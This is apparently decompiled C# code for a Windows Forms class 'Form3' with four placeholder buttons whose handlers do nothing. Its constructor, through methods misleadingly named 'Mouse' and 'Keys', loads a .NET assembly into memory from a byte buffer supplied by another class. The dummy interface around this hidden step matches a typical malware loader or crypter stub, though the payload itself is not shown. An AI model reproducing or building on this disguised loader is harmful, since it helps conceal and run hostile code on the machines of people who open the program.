using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;

namespace Qhvqj;

public class Form3 : Form
{
	internal Assembly assembly;

	private IContainer components = null;

	private Button button4;

	private Button button3;

	private Button button2;

	private Button button1;

	public Form3()
	{
		InitializeComponent();
		Mouse();
	}

	internal void Mouse()
	{
		Keys();
	}

	private void Keys()
	{
		assembly = Assembly.Load(new Form2().Buffer());
	}

	private void button4_Click(object sender, EventArgs e)
	{
	}

	private void button3_Click(object sender, EventArgs e)
	{
	}

	private void button2_Click(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		button4 = new Button();
		button3 = new Button();
		button2 = new Button();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)button4).set_Location(new Point(337, 198));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(140, 60));
		((Control)button4).set_TabIndex(7);
		((Control)button4).set_Text("button4");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button4).add_Click((EventHandler)button4_Click);
		((Control)button3).set_Location(new Point(191, 198));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(140, 60));
		((Control)button3).set_TabIndex(6);
		((Control)button3).set_Text("button3");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)button2).set_Location(new Point(337, 132));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(140, 60));
		((Control)button2).set_TabIndex(5);
		((Control)button2).set_Text("button2");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button1).set_Location(new Point(191, 132));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(140, 60));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(11f, 24f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(669, 391));
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).set_Name("Form3");
		((Control)this).set_Text("Form3");
		((Control)this).ResumeLayout(false);
	}
}
